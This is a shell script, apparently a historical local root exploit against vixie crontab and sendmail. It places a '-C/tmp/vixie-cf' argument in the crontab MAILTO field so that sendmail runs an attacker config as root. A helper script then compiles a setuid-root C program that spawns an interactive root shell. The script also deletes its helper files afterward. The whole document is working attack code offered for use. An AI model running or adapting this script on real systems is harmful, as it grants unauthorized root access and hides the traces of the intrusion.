#!/bin/sh

clear

echo '[+] Checking dependencies:'

echo -n '   [*] vixie crontab: '

if [ -u /usr/bin/crontab -a -x /usr/bin/crontab ]; then
  echo "OK"
else
  echo "NOT FOUND!"
  exit 1
fi

echo -n '   [*] Berkeley Sendmail: '

if [ -f /usr/sbin/sendmail ]; then
  echo "OK"
else
  echo "NOT FOUND!"
  exit 1
fi

echo -n '   [*] gcc compiler: '

if [ -x /usr/bin/gcc ]; then
  echo "OK"
else
  echo "NOT FOUND!"
  exit 1
fi

echo '   [?] Dependiences not verified:'
echo '      [*] proper version of vixie crontab'
echo '      [*] writable /tmp without noexec/nosuid option'
echo '[+] Exploit started.'

echo "[+] Setting up .cf file for sendmail..."

cat >/tmp/vixie-cf <<__eof__
V7/Berkeley

O QueueDirectory=/tmp
O DefaultUser=0:0

R$+		\$#local $: \$1		regular local names

Mlocal,		P=/tmp/vixie-root, F=lsDFMAw5:/|@qSPfhn9, S=10/30, R=20/40,
		T=DNS/RFC822/X-Unix,
		A=vixie-root
__eof__

echo '[+] Setting up phase #1 tool (phase #2 tool compiler)...'

cat >/tmp/vixie-root <<__eof__
#!/bin/sh

gcc /tmp/vixie-own3d.c -o /tmp/vixie-own3d
chmod 6755 /tmp/vixie-own3d
__eof__

chmod 755 /tmp/vixie-root

echo '[+] Setting up phase #2 tool (rootshell launcher)...'

cat >/tmp/vixie-own3d.c <<__eof__
main() {
  setuid(0);
  setgid(0);
  unlink("/tmp/vixie-own3d");
  execl("/bin/sh","sh","-i",0);
}
__eof__

echo '[+] Putting evil crontab entry...'

crontab - <<__eof__
MAILTO='-C/tmp/vixie-cf dupek'
* * * * * nonexist
__eof__

echo '[+] Patience is a virtue... Wait up to 60 seconds.'

ILE=0

echo -n '[+] Tick.'

while [ $ILE -lt 50 ]; do
  sleep 2
  let ILE=ILE+1
  test -f /tmp/vixie-own3d && ILE=1000
  echo -n '.'
done

echo
echo '[+] Huh, done. Removing crontab entry...'

crontab -r

echo '[+] Removing helper files...'

rm -f /tmp/vixie-own3d.c /tmp/vixie-root /tmp/vixie-cf /tmp/df* /tmp/qf* &>/dev/null

echo '[*] And now...'

if [ -f /tmp/vixie-own3d ]; then
  echo '[+] Entering root shell, babe :)'
  echo
  /tmp/vixie-own3d
  echo
else
  echo '[-] Oops, no root shell found, patched system or configuration problem :('
fi

echo '[*] Exploit done.'

